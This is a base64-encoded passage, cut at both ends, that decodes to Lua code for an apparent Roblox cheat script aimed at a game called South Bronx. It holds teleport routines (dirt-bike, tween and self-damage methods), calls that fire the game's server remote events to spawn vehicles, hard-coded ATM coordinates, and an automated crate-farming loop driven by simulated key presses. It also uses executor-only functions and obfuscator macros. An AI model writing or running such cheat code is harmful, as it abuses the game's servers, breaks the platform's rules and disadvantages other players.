Qm9hcmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE5hbWUgPSBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiQm9hcmQiKS5uYW1lLlN1cmZhY2VHdWkuVGV4dExhYmVsLlRleHQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIE5hbWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gV29ya3NwYWNlLk1hcC5Ib3VzZXM6RmluZEZpcnN0Q2hpbGQoVmFsdWUuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIEdldF9Ib2JvID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZm9yIGksdiBpbiBXb3Jrc3BhY2UuRm9sZGVycy5Ib21lbGVzc1Blb3BsZTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgQ2hlY2tIb2JvKHYuTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgIHJldHVybiBuaWwKICAgICAgICAgICAgZW5kKQoKCiAgICAgICAgICAgIGdldGdlbnYoKS5UZWxlcG9ydCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKENGcmFtZSkgICAKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5UZWxlcG9ydE1ldGhvZCA9PSAnRGlydCBCaWtlJyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgQmlrZSA9IEZpbmRfQmlrZSgpCgogICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSZW1vdGVFdmVudHMiKTpXYWl0Rm9yQ2hpbGQoIkRlYWxlcnNoaXBpbnRlcmFjdGlvbiIpOkZpcmVTZXJ2ZXIoIlNwYXduIiwgIkRpcnRCaWtlIikKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQmlrZUZvcmNlID0gZmFsc2UKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDMpIDsgQmlrZUZvcmNlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgRmluZF9CaWtlKCkgfj0gbmlsIG9yIEJpa2VGb3JjZSA9PSB0cnVlCgogICAgICAgICAgICAgICAgICAgICAgICBCaWtlID0gRmluZF9CaWtlKCkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgQmlrZSA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBZb3VyIGJpa2Ugd2FzIG5vdCBmb3VuZCFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIkZhaWxlZCIKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgYW5kIEJpa2UuRHJpdmVTZWF0IGFuZCBCaWtlLkRyaXZlU2VhdC5PY2N1cGFudCB+PSBuaWwgYW5kIEJpa2UuRHJpdmVTZWF0Lk9jY3VwYW50IH49IExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlRXZlbnRzIik6V2FpdEZvckNoaWxkKCJEZWFsZXJzaGlwaW50ZXJhY3Rpb24iKTpGaXJlU2VydmVyKCJTcGF3biIsICJEaXJ0QmlrZSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEJpa2VGb3JjZSA9IGZhbHNlCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKSA7IEJpa2VGb3JjZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIEZpbmRfQmlrZSgpIH49IG5pbCBvciBCaWtlRm9yY2UgPT0gdHJ1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgQmlrZSA9IEZpbmRfQmlrZSgpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJpa2UgPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgWW91ciBiaWtlIHdhcyBub3QgZm91bmQhYCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJGYWlsZWQiCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBCaWtlLlByaW1hcnlQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIEJpa2UuRHJpdmVTZWF0OlNpdChMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQpCgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCgogICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCA9IDEsIDUwIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIEJpa2U6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwgMS41LCAwKSkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCA9IDEsIDEwIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIEJpa2U6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwgMS41LCAwKSkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBCaWtlOkdldERlc2NlbmRhbnRzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZS5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KC4yNSkKCiAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuUmVtb3RlRXZlbnRzLkNsaWVudEVmZmVjdHM6RmlyZVNlcnZlcigiSnVtcFJlcXVlc3QiKQoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIlN1Y2Nlc3MiCiAgICAgICAgICAgICAgICBlbHNlaWYgQ29uZmlnLlNvdXRoX0Jyb254LlRlbGVwb3J0TWV0aG9kID09ICdUd2VlbicgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIERpc3RhbmNlRnJvbVBvcyA9IEdldERpc3RhbmNlKExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uICwgQ0ZyYW1lLlBvc2l0aW9uKQoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBUd2VlbiA9IFNlcnZpY2VzLlR3ZWVuU2VydmljZTpDcmVhdGUoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQsIFR3ZWVuSW5mby5uZXcoR2V0VHdlZW5TcGVlZChEaXN0YW5jZUZyb21Qb3MpLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHtDRnJhbWUgPSBDRnJhbWV9KQoKICAgICAgICAgICAgICAgICAgICBUd2VlbjpQbGF5KCkgOyBUd2Vlbi5Db21wbGV0ZWQ6V2FpdCgpIDsKCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIENGcmFtZS5Qb3NpdGlvbikuTWFnbml0dWRlID4gMjAgYW5kICJTdWNjZXNzIiBvciAiRmFpbGVkIgogICAgICAgICAgICAgICAgZWxzZWlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5UZWxlcG9ydE1ldGhvZCA9PSAnRGFtYWdlJyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgdHBfZGVib3VuY2UgdGhlbiByZXBlYXQgd2FpdCguMSkgdW50aWwgbm90IHRwX2RlYm91bmNlIGVuZAogICAgICAgICAgICAgICAgICAgIHRwX2RlYm91bmNlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIEhpZGVVSSgidGVsZXBvcnRpbmcuXG5wbGVhc2Ugd2FpdC4iKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRTEgPSBMb2NhbFBsYXllci5QbGF5ZXJHdWkuTWlzYy5CbG9vZC5JbWFnZUxhYmVsLkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuTWlzYy5CbG9vZC5JbWFnZUxhYmVsLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBFMyA9IExvY2FsUGxheWVyLlBsYXllckd1aS5NaXNjLkJsb29kLkltcGFjdC5DaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuUGxheWVyR3VpLk1pc2MuQmxvb2QuSW1wYWN0LlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBFNSA9IExpZ2h0aW5nLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9zdHJpbmcoYSkgPT0gIktOX0JsdXIiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYS5FbmFibGVkID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBIb2JvID0gR2V0X0hvYm8oKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IEhvYm8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoMSkgSG9ibyA9IEdldF9Ib2JvKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEhvYm8gfj0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSG9ibyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gSG9iby5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoSG9ibzpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCdQcm94aW1pdHlQcm9tcHQnLCB0cnVlKSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENoZWNrSG9ibyhIb2JvLk5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSG9ibyA9IEdldF9Ib2JvKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLkhlYWx0aCA8PSAxNQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbnVtYmVyID0gMQoKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZSArIFZlY3RvcjMubmV3KDAsIDEsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIG51bWJlcis9MQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnVtYmVyID4gNTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkdldFN0YXRlKCkgfj0gRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5QaHlzaWNzCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLmRlbGF5KDQsIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEUxOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRTM6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFNTpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICBEZWxldGVTZWNyZXRVSSgpCgogICAgICAgICAgICAgICAgICAgIHRwX2RlYm91bmNlID0gZmFsc2UKCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIENGcmFtZS5Qb3NpdGlvbikuTWFnbml0dWRlIDwgMjAgYW5kICJTdWNjZXNzIiBvciAiRmFpbGVkIgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIEFUTVBvc2l0aW9ucyA9IHsKICAgICAgICAgICAgICAgIEFUTTEgPSBDRnJhbWUubmV3KC0zMCwgNCwgLTMwMCk7CiAgICAgICAgICAgICAgICBBVE0yID0gQ0ZyYW1lLm5ldyg1MzksIDQsIC0zNTMpOwogICAgICAgICAgICAgICAgQVRNMyA9IENGcmFtZS5uZXcoNDk3LCA0LCA0MDMpOwogICAgICAgICAgICAgICAgQVRNNCA9IENGcmFtZS5uZXcoMjM2LCA0LCAtMTU4KTsKICAgICAgICAgICAgICAgIEFUTTUgPSBDRnJhbWUubmV3KDUyNSwgLTgsIC05Mik7CiAgICAgICAgICAgICAgICBBVE02ID0gQ0ZyYW1lLm5ldygtNDUwLCA0LCAzNzApOwogICAgICAgICAgICAgICAgQVRNNyA9IENGcmFtZS5uZXcoLTI2NiwgNCwgLTIwOSk7CiAgICAgICAgICAgICAgICBBVE04ID0gQ0ZyYW1lLm5ldygtMTEsIDQsIDIzMSk7CiAgICAgICAgICAgICAgICBBVE05ID0gQ0ZyYW1lLm5ldyg3MTcsIDQsIDQxMCk7CiAgICAgICAgICAgICAgICBBVE0xMCA9IENGcmFtZS5uZXcoLTUzMiwgMywgLTIxKTsKICAgICAgICAgICAgICAgIEFUTTExID0gQ0ZyYW1lLm5ldygtNjQ2LCA0LCAxNTUpOwogICAgICAgICAgICAgICAgQVRNMTIgPSBDRnJhbWUubmV3KDY5OCwgMywgLTI0MSk7CiAgICAgICAgICAgICAgICBBVE0xMyA9IENGcmFtZS5uZXcoLTMxNSwgNCwgMTQyKTsKICAgICAgICAgICAgICAgIEFUTTE0ID0gQ0ZyYW1lLm5ldygtMzc4LCA0LCAtMzY1KTsKICAgICAgICAgICAgICAgIEFUTTE1ID0gQ0ZyYW1lLm5ldygzNjAsIDQsIC0zNjQpOwogICAgICAgICAgICAgICAgQVRNMTYgPSBDRnJhbWUubmV3KDg3MCwgMywgLTM0Nik7CiAgICAgICAgICAgICAgICBBVE0xNyA9IENGcmFtZS5uZXcoOTA0LCAzLCAtOTkpOwogICAgICAgICAgICAgICAgQVRNMTggPSBDRnJhbWUubmV3KDEwOTUsIDMsIDE3OCk7CiAgICAgICAgICAgICAgICBBVE0xOSA9IENGcmFtZS5uZXcoMTA1NCwgNCwgNTg1KTsKICAgICAgICAgICAgICAgIEFUTTIwID0gQ0ZyYW1lLm5ldyg4OTUsIDQsIDE0Mik7CiAgICAgICAgICAgICAgICBBVE0yMSA9IENGcmFtZS5uZXcoMTAyMSwgMywgLTIyOSk7CiAgICAgICAgICAgIH07CgogICAgICAgICAgICBsb2NhbCBQcmVzc0tleVR3ZWVuID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oS2V5Q29kZSwgVHdlZW4pCiAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudChmYWxzZSwgS2V5Q29kZSwgZmFsc2UsIGdhbWUpCiAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQodHJ1ZSwgS2V5Q29kZSwgZmFsc2UsIGdhbWUpCiAgICAgICAgICAgICAgICAgICAgVHdlZW4uQ29tcGxldGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KGZhbHNlLCBLZXlDb2RlLCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgUHJlc3NLZXkgPSBmdW5jdGlvbihLZXlDb2RlLCBEdXJhdGlvbikKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIFNlcnZpY2VzLlZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KGZhbHNlLCBLZXlDb2RlLCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgICAgICAgICBTZXJ2aWNlcy5WaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudCh0cnVlLCBLZXlDb2RlLCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoRHVyYXRpb24pCiAgICAgICAgICAgICAgICAgICAgU2VydmljZXMuVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQoZmFsc2UsIEtleUNvZGUsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBib3hmYXJtX3RocmVhZAoKICAgICAgICAgICAgU3RhcnRfQm94RmFybSA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGJveGZhcm1fdGhyZWFkID0gdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLkJveEZhcm0gdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ3JhdGUiKSBhbmQgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ3JhdGUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBEaXN0YW5jZUZyb21Cb3ggPSBHZXREaXN0YW5jZShMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiwgVmVjdG9yMy5uZXcoLTU0OSwgMywgLTgyKSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUd2VlbiA9IFNlcnZpY2VzLlR3ZWVuU2VydmljZTpDcmVhdGUoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQsIFR3ZWVuSW5mby5uZXcoR2V0VHdlZW5TcGVlZChEaXN0YW5jZUZyb21Cb3gpLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHtDRnJhbWUgPSBDRnJhbWUubmV3KC01NDkuMTI5MjcyNDYwOTM3NSwgMy41MzcxNDU2MTQ2MjQwMjM0LCAtODIuOTIzOTUwMTk1MzEyNSl9KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5VHdlZW4oRW51bS5LZXlDb2RlLlcsIFR3ZWVuKSA7IFByZXNzS2V5VHdlZW4oRW51bS5LZXlDb2RlLkxlZnRTaGlmdCwgVHdlZW4pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW46UGxheSgpIDsgVHdlZW4uQ29tcGxldGVkOldhaXQoKSA7IFR3ZWVuID0gbmlsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2UuUGxhY2VIZXJlLkF0dGFjaG1lbnQuUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ3JhdGUiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2suQ3JhdGUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ3JhdGUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDcmF0ZSIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDcmF0ZSIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJDcmF0ZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlzdGFuY2VGcm9tVHJ1Y2sgPSBHZXREaXN0YW5jZShMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiwgVmVjdG9yMy5uZXcoLTQwMS4wNDM2NDAxMzY3MTg3NSwgMy4zNjIxMzI1NDkyODU4ODg3LCAtNzIuMDc3MTMzMTc4NzEwOTQpKQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVHdlZW4gPSBTZXJ2aWNlcy5Ud2VlblNlcnZpY2U6Q3JlYXRlKExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LCBUd2VlbkluZm8ubmV3KEdldFR3ZWVuU3BlZWQoRGlzdGFuY2VGcm9tVHJ1Y2spLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHtDRnJhbWUgPSBDRnJhbWUubmV3KC00MDEuMDQzNjQwMTM2NzE4NzUsIDMuMzYyMTMyNTQ5Mjg1ODg4NywgLTcyLjA3NzEzMzE3ODcxMDk0KX0pCgogICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleVR3ZWVuKEVudW0uS2V5Q29kZS5XLCBUd2VlbikgOyBQcmVzc0tleVR3ZWVuKEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIFR3ZWVuKQoKICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW46UGxheSgpIDsgVHdlZW4uQ29tcGxldGVkOldhaXQoKSA7IFR3ZWVuID0gbmlsCgogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5jcmF0ZXRydWNrMi5Nb2RlbC5DbGlja0JveC5BdHRhY2htZW50LlByb3hpbWl0eVByb21wdCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjkpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIFN0b3BfQm94RmFybSA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIG5vdCBib3hmYXJtX3RocmVhZCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgICAgICBpZiBjb3JvdXRpbmUuc3RhdHVzKGJveGZhcm1fdGhyZWFkKSA9PSAic3VzcGVuZGVkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoYm94ZmFybV90aHJlYWQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAg